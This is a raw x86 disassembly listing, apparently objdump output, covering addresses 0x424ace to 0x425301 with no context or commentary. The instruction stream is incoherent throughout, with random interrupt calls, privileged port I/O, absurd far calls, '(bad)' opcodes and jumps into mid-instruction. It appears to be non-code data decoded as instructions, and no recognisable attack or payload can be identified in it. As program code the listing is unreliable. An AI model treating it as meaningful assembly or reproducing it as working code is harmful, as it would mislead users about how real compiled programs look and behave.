  424ace:	add    eax,0x808092d9
  424ad3:	int    0x96
  424ad5:	and    al,0xcd
  424ad7:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424add:	or     ch,0x7d
  424ae0:	cmp    ecx,DWORD PTR [edi]
  424ae2:	add    al,0x11
  424ae4:	call   ebx
  424ae6:	jmp    0x424a7a
  424ae8:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424aee:	add    eax,0x808081da
  424af3:	int    0x76
  424af5:	std    
  424af6:	int    0x8d
  424af8:	std    
  424af9:	cmp    edi,DWORD PTR [ecx+0x4]
  424afc:	add    bh,bh
  424afe:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424b04:	push   ebx
  424b05:	ror    DWORD PTR [edx],cl
  424b07:	jbe    0x424ac6
  424b09:	pop    ebp
  424b0a:	push   0xcf35869f
  424b0f:	jl     0x424abe
  424b11:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424b17:	leave  
  424b18:	jbe    0x424b5f
  424b1a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424b20:	shr    al,1
  424b22:	lahf   
  424b23:	xchg   BYTE PTR ds:0xc955760a,dh
  424b29:	jbe    0x424b98
  424b2b:	dec    ecx
  424b2c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424b32:	xchg   esp,eax
  424b33:	iret   
  424b34:	inc    ebp
  424b35:	shl    ebx,cl
  424b37:	xchg   edx,eax
  424b38:	adc    bh,bl
  424b3a:	scas   eax,DWORD PTR es:[edi]
  424b3b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424b41:	lea    esi,[eax+eax*1+0x0]
  424b45:	add    BYTE PTR [esi+0x4],ch
  424b48:	cli    
  424b49:	xchg   BYTE PTR [edx-0x6047a019],al
  424b4f:	xchg   BYTE PTR ds:0x94060a,dh
  424b55:	add    BYTE PTR [eax],al
  424b57:	or     al,BYTE PTR [esi]
  424b59:	mov    esp,0xa000000
  424b5e:	jbe    0x424b10
  424b60:	or     dh,BYTE PTR [esi+0x15]
  424b63:	iret   
  424b64:	outs   dx,BYTE PTR ds:[esi]
  424b65:	std    
  424b66:	iret   
  424b67:	jno    0x424bd9
  424b69:	or     dh,BYTE PTR [esi+0x2d]
  424b6c:	or     dh,BYTE PTR [esi+0x35]
  424b6f:	leave  
  424b70:	push   es
  424b71:	jo     0x424b73
  424b73:	add    BYTE PTR [eax],al
  424b75:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b7b:	pushf  
  424b7c:	add    BYTE PTR [eax],al
  424b7e:	add    BYTE PTR [edx],cl
  424b80:	pop    ss
  424b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b82:	add    BYTE PTR [eax],al
  424b84:	add    cl,cl
  424b86:	push   es
  424b87:	lods   al,BYTE PTR ds:[esi]
  424b88:	add    BYTE PTR [eax],al
  424b8a:	add    BYTE PTR [edx-0x61],cl
  424b8d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b93:	add    BYTE PTR [eax],al
  424b95:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b9b:	les    eax,FWORD PTR [eax]
  424b9d:	add    BYTE PTR [eax],al
  424b9f:	popa   
  424ba0:	lahf   
  424ba1:	xchg   BYTE PTR ds:0x9006c9,dh
  424ba7:	add    BYTE PTR [eax],al
  424ba9:	sbb    BYTE PTR [edi+0x6c93586],bl
  424baf:	aam    0x0
  424bb1:	add    BYTE PTR [eax],al
  424bb3:	call   0xa77d257
  424bb8:	iret   
  424bb9:	fadd   QWORD PTR [eax]
  424bbb:	add    BYTE PTR [eax],al
  424bbd:	leave  
  424bbe:	push   es
  424bbf:	in     al,0x0
  424bc1:	add    BYTE PTR [eax],al
  424bc3:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424bc9:	add    ecx,ecx
  424bcb:	jbe    0x424bd2
  424bcd:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424bd3:	or     ecx,ecx
  424bd5:	jbe    0x424ba3
  424bd7:	inc    ecx
  424bd8:	lahf   
  424bd9:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424bdf:	jbe    0x424c06
  424be1:	pusha  
  424be2:	lahf   
  424be3:	xchg   BYTE PTR ds:0x493d76c9,dh
  424be9:	and    DWORD PTR [esi-0x3292c4cb],eax
  424bef:	int3   
  424bf0:	push   es
  424bf1:	jo     0x424bf3
  424bf3:	add    BYTE PTR [eax],al
  424bf5:	shr    ebx,cl
  424bf7:	xchg   edx,eax
  424bf8:	add    DWORD PTR [edx],eax
  424bfa:	scas   eax,DWORD PTR es:[edi]
  424bfb:	or     esp,ecx
  424bfd:	test   DWORD PTR [eax+eax*1+0x0],eax
  424c01:	add    BYTE PTR [esp+eax*1-0x7],ch
  424c05:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424c0b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424c15:	add    BYTE PTR [eax-0x7c],dh
  424c18:	int    0xb3
  424c1a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424c20:	inc    esp
  424c21:	add    BYTE PTR [eax],al
  424c23:	add    BYTE PTR [edx+0x70],ah
  424c26:	add    BYTE PTR [ecx-0x78],dh
  424c29:	or     dh,BYTE PTR [esi+0x7d]
  424c2c:	iret   
  424c2d:	jbe    0x424bec
  424c2f:	jo     0x424bfe
  424c31:	or     BYTE PTR ds:0x808081,ah
  424c37:	push   eax
  424c38:	int    0x76
  424c3a:	jge    0x424c3c
  424c3c:	icebp  
  424c3d:	int    0x76
  424c3f:	std    
  424c40:	int    0x8d
  424c42:	std    
  424c43:	cmp    edi,DWORD PTR [ecx+0x4]
  424c46:	add    bh,bh
  424c48:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c4e:	push   ebx
  424c4f:	ror    DWORD PTR [edx],cl
  424c51:	jbe    0x424c60
  424c53:	int    0x8d
  424c55:	std    
  424c56:	int    0x76
  424c58:	std    
  424c59:	cmp    ecx,DWORD PTR [edi]
  424c5b:	add    al,0x11
  424c5d:	call   ebx
  424c5f:	lods   eax,DWORD PTR ds:[esi]
  424c60:	sub    bl,dl
  424c62:	jmp    0x424bf6
  424c64:	push   ebx
  424c65:	jge    0x424c34
  424c67:	jbe    0x424c26
  424c69:	inc    ebx
  424c6a:	rcl    esp,cl
  424c6c:	xchg   esi,eax
  424c6d:	or     dh,BYTE PTR [esi+0x75]
  424c70:	in     al,dx
  424c71:	das    
  424c72:	int    0x80
  424c74:	int    0x8d
  424c76:	jne    0x424c82
  424c78:	jbe    0x424c37
  424c7a:	int    0x76
  424c7c:	mov    ebp,0x4dd4d343
  424c81:	int    0x70
  424c83:	sbb    al,0xcd
  424c85:	mov    bl,0x25
  424c87:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c91:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c9b:	int    0xb3
  424c9d:	sub    eax,0xcd808081
  424ca2:	xchg   esi,eax
  424ca3:	dec    esp
  424ca4:	int    0x62
  424ca6:	cmp    al,0x87
  424ca8:	xor    DWORD PTR [edx],ecx
  424caa:	jo     0x424cd0
  424cac:	int    0x76
  424cae:	stc    
  424caf:	int    0x8d
  424cb1:	stc    
  424cb2:	cmp    edi,DWORD PTR [ecx+0x4]
  424cb5:	add    bh,bh
  424cb7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424cbd:	push   ebx
  424cbe:	ror    DWORD PTR [edx],cl
  424cc0:	jbe    0x424ccf
  424cc2:	int    0x96
  424cc4:	and    al,0x9a
  424cc6:	pop    ebx
  424cc7:	mov    ebp,0xf5e2
  424ccc:	push   es
  424ccd:	ins    DWORD PTR es:[edi],dx
  424cce:	das    
  424ccf:	add    eax,0x80808099
  424cd4:	add    dh,dl
  424cd6:	and    al,0xcd
  424cd8:	lock pop ebx
  424cda:	mov    ebp,0xf52c
  424cdf:	push   es
  424ce0:	ins    DWORD PTR es:[edi],dx
  424ce1:	das    
  424ce2:	add    eax,0x808080c5
  424ce7:	int    0x76
  424ce9:	and    al,0xcd
  424ceb:	lock int 0xd5
  424cee:	mov    ebp,0xfbe7
  424cf3:	push   es
  424cf4:	ins    DWORD PTR es:[edi],dx
  424cf5:	das    
  424cf6:	add    eax,0x808080d1
  424cfb:	call   0x0:0xf90ebd5b
  424d02:	push   es
  424d03:	ins    DWORD PTR es:[edi],dx
  424d04:	das    
  424d05:	add    eax,0x8080802d
  424d0a:	int    0x8
  424d0c:	and    eax,0x43808081
  424d11:	sbb    al,0xd6
  424d13:	sbb    cl,ch
  424d15:	or     BYTE PTR [ecx],dl
  424d17:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424d21:	int    0x8d
  424d23:	dec    esp
  424d24:	add    BYTE PTR [ecx+0x70005b94],dl
  424d2a:	and    al,0xcd
  424d2c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424d32:	or     ch,0x7d
  424d35:	cmp    ecx,DWORD PTR [edi]
  424d37:	add    al,0x11
  424d39:	call   ebx
  424d3b:	jmp    0x424ccf
  424d3d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424d43:	(bad)
  424d47:	dec    ecx
  424d48:	and    BYTE PTR [esi-0x778932cb],al
  424d4e:	int    0x8d
  424d50:	mov    ch,cl
  424d52:	jbe    0x424d78
  424d54:	shr    ebx,cl
  424d56:	xchg   edx,eax
  424d57:	adc    al,BYTE PTR [edx]
  424d59:	scas   eax,DWORD PTR es:[edi]
  424d5a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d60:	sbb    ch,cl
  424d62:	ins    BYTE PTR es:[edi],dx
  424d63:	cmp    al,0xcd
  424d65:	lea    ebp,[edi+eax*4]
  424d68:	lds    ecx,FWORD PTR [edx]
  424d6a:	outs   dx,BYTE PTR ds:[esi]
  424d6b:	adc    al,0xcd
  424d6d:	jbe    0x424d9b
  424d6f:	leave  
  424d70:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d77:	sub    al,0xa
  424d79:	pushf  
  424d7a:	test   ch,cl
  424d7c:	jbe    0x424dae
  424d7e:	int    0x8d
  424d80:	sub    al,0xa
  424d82:	outs   dx,BYTE PTR ds:[esi]
  424d83:	mov    ch,cl
  424d85:	jbe    0x424d9b
  424d87:	int    0x8d
  424d89:	sub    al,0xa
  424d8b:	outs   dx,BYTE PTR ds:[esi]
  424d8c:	dec    esp
  424d8d:	in     al,dx
  424d8e:	adc    al,0xcd
  424d90:	jbe    0x424db6
  424d92:	int    0x6c
  424d94:	cmp    al,0xcd
  424d96:	lea    ebp,[edi+eax*4]
  424d99:	lds    ecx,FWORD PTR [edx]
  424d9b:	outs   dx,BYTE PTR ds:[esi]
  424d9c:	adc    al,0xcd
  424d9e:	jbe    0x424dcc
  424da0:	add    al,0x2c
  424da2:	or     cl,0x76
  424da5:	icebp  
  424da6:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424db0:	cmp    ebx,ebp
  424db2:	int    0xc5
  424db4:	arpl   sp,bp
  424db6:	xchg   edx,eax
  424db7:	cmp    ebp,DWORD PTR [ebp-0x56]
  424dba:	test   al,0xcb
  424dbc:	shl    BYTE PTR [eax+eax*4],cl
  424dbf:	xchg   esi,eax
  424dc0:	int    0xed
  424dc2:	jno    0x424e35
  424dc4:	das    
  424dc5:	mov    ebx,0x74cf146e
  424dca:	mov    BYTE PTR [edi+ebp*1],bl
  424dcd:	mov    ebx,0x9a5b867e
  424dd2:	leave  
  424dd3:	jbe    0x424dd2
  424dd5:	dec    ecx
  424dd6:	and    DWORD PTR [esi-0x672f5cb],eax
  424ddc:	push   es
  424ddd:	retf   
  424dde:	aam    0xb4
  424de0:	popa   
  424de1:	shl    DWORD PTR [ecx],1
  424de3:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424de9:	out    0x88,al
  424deb:	xchg   edx,edi
  424ded:	pop    esi
  424dee:	out    0x4c,al
  424df0:	or     BYTE PTR [ebp-0x33],0xdc
  424df4:	mov    BYTE PTR [edi-0x77197806],al
  424dfa:	pop    esi
  424dfb:	out    0x4c,al
  424dfd:	cmp    BYTE PTR [edx-0x33],0x8d
  424e01:	std    
  424e02:	int    0xe6
  424e04:	std    
  424e05:	cmp    edx,DWORD PTR [ebx]
  424e07:	add    al,0xf8
  424e09:	call   ebx
  424e0b:	jmp    0xd41e1b38
  424e10:	in     al,dx
  424e11:	xchg   edx,eax
  424e12:	push   ebx
  424e13:	cld    
  424e14:	add    al,0xf2
  424e16:	std    
  424e17:	add    al,0xd3
  424e19:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424e20:	sub    BYTE PTR [ebx-0x6],dl
  424e23:	adc    bh,al
  424e25:	dec    ecx
  424e26:	and    DWORD PTR [esi-0x2197ecb],eax
  424e2c:	int    0x8d
  424e2e:	std    
  424e2f:	int    0xe6
  424e31:	std    
  424e32:	cmp    edx,DWORD PTR [ebx]
  424e34:	add    al,0xf8
  424e36:	call   ebx
  424e38:	jmp    0x424dcc
  424e3a:	shr    ecx,cl
  424e3c:	sub    BYTE PTR [ebx-0x10],dl
  424e3f:	inc    ebx
  424e40:	(bad)  
  424e41:	stc    
  424e42:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424e49:	ror    BYTE PTR [eax-0x12326980],cl
  424e4f:	add    al,0xed
  424e51:	push   eax
  424e52:	leave  
  424e53:	jbe    0x424dfa
  424e55:	mov    edx,0xc98080ac
  424e5a:	jbe    0x424e11
  424e5c:	xchg   eax,ecx
  424e5e:	add    BYTE PTR [eax-0x68528937],0x40
  424e65:	add    BYTE PTR [eax-0x51068937],0x30
  424e6c:	test   BYTE PTR [eax-0x4a028937],al
  424e72:	lods   al,BYTE PTR ds:[esi]
  424e73:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e7a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e81:	add    BYTE PTR [eax-0x78628937],0x80
  424e88:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e8f:	add    BYTE PTR [eax-0x32128937],0x71
  424e96:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e9d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424ea4:	mov    al,BYTE PTR [eax-0x322ccc80]
  424eaa:	(bad)  
  424eab:	stc    
  424eac:	cmp    ebx,edx
  424eae:	clc    
  424eaf:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424eb5:	repnz popa 
  424eb7:	and    al,BYTE PTR [eax-0x7a34ed80]
  424ebd:	mov    BYTE PTR [eax+0x42021280],0xa4
  424ec4:	add    BYTE PTR [eax+0x3cded312],0x80
  424ecb:	or     cl,0x76
  424ece:	cmc    
  424ecf:	icebp  
  424ed0:	lea    eax,[eax-0x2893680]
  424ed6:	jnp    0x424eac
  424ed8:	add    BYTE PTR [eax+0x18f976c9],0x30
  424edf:	add    BYTE PTR [eax-0x32068933],0x96
  424ee6:	std    
  424ee7:	ss dec eax
  424ee9:	pushf  
  424eea:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ef1:	int    0xe3
  424ef3:	push   esi
  424ef4:	jp     0x424ef5
  424ef6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424efd:	int    0x76
  424eff:	std    
  424f00:	xchg   DWORD PTR [esi-0x78],esi
  424f03:	int    0x96
  424f05:	std    
  424f06:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424f0c:	xor    ch,cl
  424f0e:	jbe    0x424f21
  424f10:	int    0x96
  424f12:	in     eax,dx
  424f13:	sbb    BYTE PTR ss:[edi-0x80],cl
  424f17:	cmp    BYTE PTR [ebx],0xd2
  424f1a:	int    0x96
  424f1c:	mov    ebp,0xe261d253
  424f21:	fadd   DWORD PTR [eax-0x320ecc80]
  424f27:	jbe    0x424ede
  424f29:	xchg   DWORD PTR [ebx],edx
  424f2b:	popa   
  424f2c:	fist   WORD PTR [eax+eax*4-0x80]
  424f30:	xor    esi,ecx
  424f32:	xchg   DWORD PTR [esi-0x5a893253],edx
  424f38:	int    0xd6
  424f3a:	xor    ch,cl
  424f3c:	out    0x9d,al
  424f3e:	adc    bh,bl
  424f40:	mov    DWORD PTR [ecx-0x80],esi
  424f43:	sub    BYTE PTR [ebx],0xf1
  424f46:	int    0x76
  424f48:	xchg   ebp,eax
  424f49:	adc    bh,bl
  424f4b:	mov    dh,0x2c
  424f4d:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f54:	clc    
  424f55:	int    0x96
  424f57:	icebp  
  424f58:	push   esi
  424f59:	out    0x1e,al
  424f5b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f62:	icebp  
  424f63:	adc    dh,bl
  424f65:	pop    es
  424f66:	push   edx
  424f67:	add    BYTE PTR [eax+0x72f9943],0x63
  424f6e:	add    BYTE PTR [eax],al
  424f70:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f76:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f7d:	pop    ebx
  424f7e:	cwde   
  424f7f:	call   0x8043:0xd9ed76c9
  424f86:	or     cl,0x76
  424f89:	adc    DWORD PTR [edx+0x7e],esi
  424f8c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f93:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f9a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424fa1:	add    BYTE PTR [eax-0x275a8937],0x58
  424fa8:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424faf:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424fb6:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424fbd:	add    BYTE PTR [eax-0x449a8937],0x6f
  424fc4:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424fcb:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424fd2:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424fd9:	add    BYTE PTR [eax-0x44f28937],0x4d
  424fe0:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424fe7:	add    BYTE PTR [eax-0x32528933],0x8d
  424fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fef:	dec    ebp
  424ff0:	bound  ebp,QWORD PTR [ebx]
  424ff2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424ff9:	dec    ebp
  424ffa:	pop    ds
  424ffb:	and    eax,DWORD PTR [eax-0x2c2ed080]
  425001:	pop    edi
  425002:	xchg   ecx,eax
  425003:	mov    bh,0x7e
  425005:	stc    
  425006:	xor    edi,DWORD PTR [ebp-0x33]
  425009:	jbe    0x425008
  42500b:	int    0x96
  42500d:	stc    
  42500e:	sub    edx,edx
  425010:	int    0x96
  425012:	cmc    
  425013:	dec    ebp
  425014:	inc    edi
  425015:	outs   dx,DWORD PTR ds:[esi]
  425016:	add    BYTE PTR [eax-0x69322dcd],0x11
  42501d:	xor    edx,edx
  42501f:	int    0x96
  425021:	in     eax,dx
  425022:	push   ebx
  425023:	sar    BYTE PTR [ebx],cl
  425025:	fisubr DWORD PTR [ecx-0x27]
  425028:	ret    
  425029:	add    BYTE PTR [eax],al
  42502b:	clc    
  42502c:	test   ebp,0x72c34c96
  425032:	push   ds
  425033:	add    BYTE PTR [eax+0x76cdf133],0xbd
  42503a:	int    0xd6
  42503c:	mov    ch,0x33
  42503e:	leave  
  42503f:	das    
  425040:	sar    DWORD PTR [ecx+0x69],1
  425043:	fisttp DWORD PTR [edx]
  425045:	xchg   ecx,eax
  425046:	mov    ebx,ebp
  425048:	popa   
  425049:	add    BYTE PTR [eax-0x6a893680],0x9b
  425050:	push   esp
  425051:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425058:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42505f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425066:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42506d:	pop    ebp
  42506e:	call   0xcdf4:0xf880806f
  425075:	xchg   esi,eax
  425076:	lods   eax,DWORD PTR ds:[esi]
  425077:	int    0xa6
  425079:	mov    BYTE PTR [ebx-0x2e],dl
  42507c:	int    0x96
  42507e:	popf   
  42507f:	xor    edx,edx
  425081:	int    0x96
  425083:	xchg   ebp,eax
  425084:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425086:	push   eax
  425087:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42508e:	mov    BYTE PTR [eax+0x2c],bl
  425091:	ret    0xafd
  425094:	jbe    0x42502b
  425096:	int    0x76
  425098:	icebp  
  425099:	int    0x96
  42509b:	or     eax,0xf3f7f534
  4250a0:	int    0x96
  4250a2:	xchg   ebp,eax
  4250a3:	xor    al,0x23
  4250a5:	inc    esp
  4250a6:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  4250aa:	inc    esi
  4250ab:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  4250b2:	rol    esi,0x80
  4250b5:	add    BYTE PTR [edi-0x59328a8a],0x6d
  4250bc:	cmp    ebx,edx
  4250be:	clc    
  4250bf:	hlt    
  4250c0:	int    0x96
  4250c2:	gs mov edi,0xc3d9
  4250c8:	ss aaa 
  4250ca:	push   esi
  4250cb:	add    BYTE PTR [eax+0xc56d233],0x6d
  4250d2:	add    BYTE PTR [eax],al
  4250d4:	xchg   DWORD PTR [ebp-0x33],edi
  4250d7:	jbe    0x4250d6
  4250d9:	int    0x96
  4250db:	stc    
  4250dc:	sub    edx,edx
  4250de:	int    0x96
  4250e0:	cmc    
  4250e1:	dec    ebp
  4250e2:	inc    edi
  4250e3:	outs   dx,DWORD PTR ds:[esi]
  4250e4:	add    BYTE PTR [eax-0x69322dcd],0x11
  4250eb:	xor    edx,edx
  4250ed:	int    0x96
  4250ef:	in     eax,dx
  4250f0:	push   ebx
  4250f1:	sar    BYTE PTR [ebx],cl
  4250f3:	(bad)  
  4250f5:	hlt    
  4250f6:	int    0x96
  4250f8:	dec    esp
  4250f9:	xor    esi,ecx
  4250fb:	int    0x76
  4250fd:	mov    ebp,0x33b5a6cd
  425102:	leave  
  425103:	das    
  425104:	rol    ebp,1
  425106:	int    0xdb
  425108:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42510e:	das    
  42510f:	pop    es
  425110:	pop    esp
  425111:	add    BYTE PTR [eax],al
  425113:	add    BYTE PTR [edx-0x2d349c58],ch
  425119:	mov    BYTE PTR [eax+0x4edcd96],al
  42511f:	in     eax,dx
  425120:	jo     0x4250eb
  425122:	jbe    0x4250f4
  425124:	xchg   ecx,eax
  425125:	aaa    
  425126:	ficom  WORD PTR [ebx]
  425128:	pop    ebp
  425129:	mov    ebp,0xa25230a
  42512e:	jbe    0x425185
  425130:	leave  
  425131:	jbe    0x425190
  425133:	mov    esi,0xa13de37
  425138:	jbe    0x42519f
  42513a:	leave  
  42513b:	jbe    0x4251aa
  42513d:	fidiv  WORD PTR [edi]
  42513f:	ficom  WORD PTR [ebx]
  425141:	or     dh,BYTE PTR [esi+0x75]
  425144:	pop    ebx
  425145:	leave  
  425146:	jbe    0x4251c5
  425148:	scas   al,BYTE PTR es:[edi]
  425149:	aaa    
  42514a:	ficom  WORD PTR [ebx]
  42514c:	or     dh,BYTE PTR [esi+0xd]
  42514f:	cwde   
  425150:	call   0xde37:0x96f176c9
  425157:	adc    ecx,DWORD PTR [edx]
  425159:	jbe    0x4250f0
  42515b:	cmp    ebx,edx
  42515d:	cmp    eax,DWORD PTR [eax]
  42515f:	pop    edi
  425160:	dec    ecx
  425161:	and    DWORD PTR [esi-0x628936cb],eax
  425167:	out    0x37,al
  425169:	ficom  WORD PTR [ebx]
  42516b:	jp     0x425177
  42516d:	jbe    0x425114
  42516f:	int    0xd3
  425171:	or     dl,BYTE PTR [esi-0x4a19f513]
  425177:	iret   
  425178:	xchg   ecx,eax
  425179:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425180:	push   ebx
  425181:	ror    bh,cl
  425183:	je     0x42514c
  425185:	ror    ch,1
  425187:	xor    ch,cl
  425189:	pushf  
  42518a:	test   BYTE PTR [edi],ch
  42518c:	inc    ebp
  42518d:	loop   0x425121
  42518f:	shr    esp,cl
  425191:	xchg   edx,eax
  425192:	int    0x1c
  425194:	int    0x6c
  425196:	test   BYTE PTR [ebx],bh
  425198:	ins    DWORD PTR es:[edi],dx
  425199:	adc    bh,bl
  42519b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42519c:	mov    esi,0xf1534229
  4251a1:	or     dl,BYTE PTR [esi-0x6893207]
  4251a7:	xchg   DWORD PTR [ebp-0x2d],ebp
  4251aa:	in     eax,0x28
  4251ac:	inc    ebx
  4251ad:	jbe    0x4251fb
  4251af:	das    
  4251b0:	or     BYTE PTR [edi-0x327f7f80],bh
  4251b6:	jbe    0x4251b1
  4251b8:	add    al,0xb6
  4251ba:	mov    ebp,0x11e60a80
  4251bf:	int    0x76
  4251c1:	stc    
  4251c2:	push   es
  4251c3:	ins    DWORD PTR es:[edi],dx
  4251c4:	aam    0xb6
  4251c6:	cmp    ebp,DWORD PTR [ebp+0xa]
  4251c9:	out    0xf5,al
  4251cb:	int    0x96
  4251cd:	mov    ebp,0xcf88a6cd
  4251d2:	fs xor ch,cl
  4251d5:	xchg   esi,eax
  4251d6:	mov    BYTE PTR [edi-0x5269f527],al
  4251dc:	retf   0x922
  4251df:	xchg   esi,eax
  4251e0:	add    ch,cl
  4251e2:	xchg   esi,eax
  4251e3:	stc    
  4251e4:	xchg   ecx,ebx
  4251e6:	retf   0x2014
  4251e9:	int    0xa6
  4251eb:	lods   eax,DWORD PTR ds:[esi]
  4251ec:	or     DWORD PTR [ebx],ebx
  4251ee:	retf   0x96
  4251f1:	int    0xa6
  4251f3:	stc    
  4251f4:	xchg   ecx,esp
  4251f6:	int    0xe6
  4251f8:	mov    BYTE PTR [ecx],cl
  4251fa:	adc    al,0x43
  4251fc:	int    0x96
  4251fe:	cmc    
  4251ff:	ins    BYTE PTR es:[edi],dx
  425200:	add    al,0xea
  425202:	std    
  425203:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425209:	push   ebx
  42520a:	sar    BYTE PTR [ebx],cl
  42520c:	ror    DWORD PTR [edx],cl
  42520e:	jbe    0x425205
  425210:	push   ecx
  425211:	(bad)  
  425212:	cmc    
  425213:	int    0x96
  425215:	cmc    
  425216:	add    al,0x11
  425218:	call   ebx
  42521a:	repz xchg edx,eax
  42521c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425222:	xchg   esi,eax
  425223:	stc    
  425224:	inc    ebx
  425225:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42522b:	int    0x76
  42522d:	adc    ebp,ecx
  42522f:	xchg   esi,eax
  425230:	stc    
  425231:	int    0xa6
  425233:	mov    ebp,0xcffdad04
  425238:	test   cl,dh
  42523a:	int    0x96
  42523c:	stc    
  42523d:	iret   
  42523e:	adc    al,0x5b
  425240:	int    0xa6
  425242:	dec    esp
  425243:	shl    ebx,cl
  425245:	sub    BYTE PTR [ebx-0x2e],dl
  425248:	cmp    edx,ebx
  42524a:	or     dh,BYTE PTR [esi+0x11]
  42524d:	push   ecx
  42524e:	(bad)  
  42524f:	adc    ebp,ecx
  425251:	xchg   esi,eax
  425252:	adc    DWORD PTR [ecx+edx*1],eax
  425255:	call   ebx
  425257:	repz xchg edx,eax
  425259:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42525f:	xchg   esi,eax
  425260:	stc    
  425261:	xchg   edx,ebx
  425263:	xor    esp,edx
  425265:	or     dh,BYTE PTR [esi-0x43]
  425268:	inc    ebx
  425269:	lds    ebp,FWORD PTR [edi]
  42526b:	pop    es
  42526c:	outs   dx,DWORD PTR ds:[esi]
  42526d:	add    BYTE PTR [eax],al
  42526f:	add    ch,cl
  425271:	jbe    0x425260
  425273:	int    0x96
  425275:	mov    ch,0x4
  425277:	jmp    0xd384:0xd2046cfd
  42527e:	mov    ebp,0x3bd25328
  425283:	ror    ebp,cl
  425285:	popf   
  425286:	int    0xf1
  425288:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42528e:	in     eax,0x28
  425290:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425296:	or     ah,BYTE PTR [esi-0x12697613]
  42529c:	add    al,0xe6
  42529e:	in     eax,dx
  42529f:	xchg   BYTE PTR [edi],ch
  4252a1:	or     edx,DWORD PTR [ebp-0x55ffff01]
  4252a7:	test   al,0x63
  4252a9:	retf   
  4252aa:	ror    BYTE PTR [eax-0x12326980],cl
  4252b0:	add    al,0xed
  4252b2:	adc    al,0xcd
  4252b4:	jbe    0x42523e
  4252b6:	leave  
  4252b7:	jbe    0x4252ca
  4252b9:	dec    ecx
  4252ba:	and    DWORD PTR [esi-0x28936cb],eax
  4252c0:	inc    ecx
  4252c1:	and    DWORD PTR [esi+0x5b80cd35],eax
  4252c7:	cwde   
  4252c8:	or     dh,BYTE PTR [esi-0x7]
  4252cb:	leave  
  4252cc:	jbe    0x4252c3
  4252ce:	into   
  4252cf:	and    DWORD PTR [esi+0x76c99a35],eax
  4252d5:	in     eax,dx
  4252d6:	inc    esi
  4252d7:	sbb    DWORD PTR [ebp-0x22932de],esi
  4252dd:	int    0x8d
  4252df:	std    
  4252e0:	sar    bh,0x5d
  4252e3:	shl    DWORD PTR [ecx],1
  4252e5:	xchg   BYTE PTR ds:0xd3f03baa,dh
  4252eb:	repnz sub BYTE PTR [ebx],bh
  4252ee:	adc    ebx,edx
  4252f0:	out    dx,eax
  4252f1:	xchg   edx,eax
  4252f2:	push   ebx
  4252f3:	add    cl,ch
  4252f5:	lea    edx,[ecx]
  4252f7:	int    0x96
  4252f9:	adc    DWORD PTR [ebx],edi
  4252fb:	jge    0x425338
  4252fd:	(bad)  
  4252ff:	jmp    0x425293
  425301:	shr    edx,cl
